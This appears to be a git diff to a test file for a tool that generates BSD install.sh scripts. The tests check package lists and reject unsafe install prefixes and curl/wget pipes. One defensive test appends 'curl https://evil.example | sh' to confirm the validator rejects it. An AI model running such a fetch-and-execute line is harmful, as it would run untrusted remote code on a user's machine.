@@ -1,7 +1,8 @@
 // SPDX-License-Identifier: AGPL-3.0-or-later
-import { mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
+import { chmodSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
 import { tmpdir } from 'node:os';
 import { join } from 'node:path';
+import { spawnSync } from 'node:child_process';
 import { describe, expect, it } from 'vitest';
 
 import {
@@ -12,6 +13,7 @@ import {
   assertLinuxHost,
   assertMacosHost,
   assertVersionAlignment,
+  BSD_PRIMARY_RUNTIME_PACKAGES,
   bsdHonestyNotice,
   bsdLaunchContractText,
   bsdPackageManifest,
@@ -22,6 +24,7 @@ import {
   elfOsAbiVerdict,
   elfPtInterp,
   formatSha256SumFile,
+  generateBsdInstallSh,
   linuxHonestyNotice,
   loadAlignedVersion,
   macosHonestyNotice,
@@ -36,6 +39,7 @@ import {
   runUnixReleaseCli,
   sha256Hex,
   stageBsdPackage,
+  validateBsdInstallShContent,
   validateBsdPackageLayout,
   validateLinuxPackageLayout,
   validateMacosPackageLayout,
@@ -234,6 +238,7 @@ describe('release-unix native BSD layout', () => {
       writeFileSync(join(dir, 'package-manifest.zon'), bsdPackageManifest('freebsd'));
       writeFileSync(join(dir, 'README.txt'), bsdHonestyNotice('freebsd', { host: 'linux/x64' }));
       writeFileSync(join(dir, 'LAUNCH.txt'), bsdLaunchContractText('freebsd'));
+      writeFileSync(join(dir, 'install.sh'), generateBsdInstallSh('freebsd'));
 
       expect(validateBsdPackageLayout(dir, 'freebsd')).toEqual({ ok: true });
 
@@ -302,6 +307,95 @@ describe('release-unix native BSD layout', () => {
       expect(launch).toMatch(/never ephemeral/);
       expect(launch).toMatch(/No alternate port/);
       expect(readFileSync(join(pkg, 'README.txt'), 'utf8')).not.toMatch(/portable-web\/PWA bundle/i);
+      const install = readFileSync(join(pkg, 'install.sh'), 'utf8');
+      expect(validateBsdInstallShContent(install, 'openbsd')).toEqual({ ok: true });
+      expect(install).toMatch(/gtk\+4/);
+      expect(install).toMatch(/webkitgtk60/);
+    } finally {
+      rmSync(dir, { recursive: true, force: true });
+    }
+  });
+});
+
+describe('BSD install.sh generation', () => {
+  it('generates FreeBSD and OpenBSD installers with exact primary packages', () => {
+    expect(BSD_PRIMARY_RUNTIME_PACKAGES.freebsd).toEqual(['gtk4', 'webkit2-gtk_60']);
+    expect(BSD_PRIMARY_RUNTIME_PACKAGES.openbsd).toEqual(['gtk+4', 'webkitgtk60']);
+
+    const f = generateBsdInstallSh('freebsd', { version: '0.1.3' });
+    expect(validateBsdInstallShContent(f, 'freebsd')).toEqual({ ok: true });
+    expect(f).toMatch(/^#!\/bin\/sh/);
+    expect(f).toMatch(/EXPECTED_OS="FreeBSD"/);
+    expect(f).toMatch(/pkg install -y gtk4 webkit2-gtk_60/);
+    expect(f).toMatch(/DEFAULT_PREFIX="\/usr\/local"/);
+    expect(f).toMatch(/--dry-run/);
+    expect(f).toMatch(/--prefix/);
+    expect(f).toMatch(/Root \(or sufficient privileges\) and network are needed ONLY/);
+    expect(f).not.toMatch(/curl\s*\|/);
+    expect(f).not.toMatch(/\bcurl\b/);
+    expect(f).not.toMatch(/\bwget\b/);
+
+    const o = generateBsdInstallSh('openbsd', { version: '0.1.3' });
+    expect(validateBsdInstallShContent(o, 'openbsd')).toEqual({ ok: true });
+    expect(o).toMatch(/EXPECTED_OS="OpenBSD"/);
+    expect(o).toMatch(/pkg_add gtk\+4 webkitgtk60/);
+    expect(o).not.toMatch(/pkg install/);
+  });
+
+  it('rejects installer content that curl-pipes or wrong OS packages', () => {
+    const bad = `${generateBsdInstallSh('freebsd')}\ncurl https://evil.example | sh\n`;
+    const v = validateBsdInstallShContent(bad, 'freebsd');
+    expect(v.ok).toBe(false);
+    if (!v.ok) expect(v.errors.join(' ')).toMatch(/curl|pipe|download/i);
+
+    const wrongOs = generateBsdInstallSh('freebsd').replaceAll('FreeBSD', 'Linux');
+    const v2 = validateBsdInstallShContent(wrongOs, 'freebsd');
+    expect(v2.ok).toBe(false);
+  });
+
+  it('executes a non-root OpenBSD install into an isolated prefix and rejects unsafe prefixes', () => {
+    const dir = mkdtempSync(join(tmpdir(), 'onyx-ux-installer-'));
+    try {
+      const pkg = join(dir, 'package');
+      const fakeBin = join(dir, 'fake-bin');
+      const prefix = join(dir, 'prefix');
+      mkdirSync(join(pkg, 'bin'), { recursive: true });
+      mkdirSync(join(pkg, 'resources', 'dist'), { recursive: true });
+      mkdirSync(fakeBin, { recursive: true });
+      writeFileSync(join(pkg, 'bin', 'onyx'), 'native-binary-fixture\n');
+      writeFileSync(join(pkg, 'resources', 'dist', 'index.html'), '<html>fixture</html>\n');
+      writeFileSync(join(pkg, 'install.sh'), generateBsdInstallSh('openbsd'));
+      writeFileSync(
+        join(fakeBin, 'uname'),
+        '#!/bin/sh\ncase "$1" in -s) echo OpenBSD ;; -m) echo amd64 ;; *) exit 2 ;; esac\n',
+      );
+      chmodSync(join(fakeBin, 'uname'), 0o755);
+
+      const env = { ...process.env, PATH: `${fakeBin}:/usr/bin:/bin` };
+      const installed = spawnSync(
+        '/bin/sh',
+        [join(pkg, 'install.sh'), '--prefix', prefix, '--no-deps'],
+        { env, encoding: 'utf8' },
+      );
+      expect(installed.status, installed.stderr).toBe(0);
+      expect(readFileSync(join(prefix, 'bin', 'onyx'), 'utf8')).toBe('native-binary-fixture\n');
+      expect(readFileSync(join(prefix, 'resources', 'dist', 'index.html'), 'utf8')).toContain('fixture');
+
+      const rootPrefix = spawnSync(
+        '/bin/sh',
+        [join(pkg, 'install.sh'), '--prefix', '/', '--no-deps'],
+        { env, encoding: 'utf8' },
+      );
+      expect(rootPrefix.status).not.toBe(0);
+      expect(rootPrefix.stderr).toMatch(/must not be the filesystem root/i);
+
+      const dotPrefix = spawnSync(
+        '/bin/sh',
+        [join(pkg, 'install.sh'), '--prefix', `${prefix}/../escape`, '--no-deps'],
+        { env, encoding: 'utf8' },
+      );
+      expect(dotPrefix.status).not.toBe(0);
+      expect(dotPrefix.stderr).toMatch(/dot path segments/i);
     } finally {
       rmSync(dir, { recursive: true, force: true });
     }
@@ -324,11 +418,12 @@ describe('release-unix honesty + checksum helpers', () => {
     expect(b).not.toMatch(/portable web\/pwa/i);
     expect(b).toMatch(/WebKitGTK/i);
     expect(b).toMatch(/webkit2-gtk_60/);
-    expect(b).toMatch(/webkit2-gtk_41/);
+    expect(b).toMatch(/install\.sh/);
+    expect(b).toMatch(/NOT codesigned/);
     const o = bsdHonestyNotice('openbsd', { host: 'linux/x64' });
     expect(o).toMatch(/webkitgtk60/);
-    expect(o).toMatch(/webkitgtk4/);
     expect(o).toMatch(/gtk\+4/);
+    expect(o).toMatch(/install\.sh/);
     expect(bsdLaunchContractText('freebsd')).toMatch(/127\.0\.0\.1:42691\/app/);
     expect(bsdPackageManifest('freebsd')).toMatch(/host = "bsd_host"/);
   });
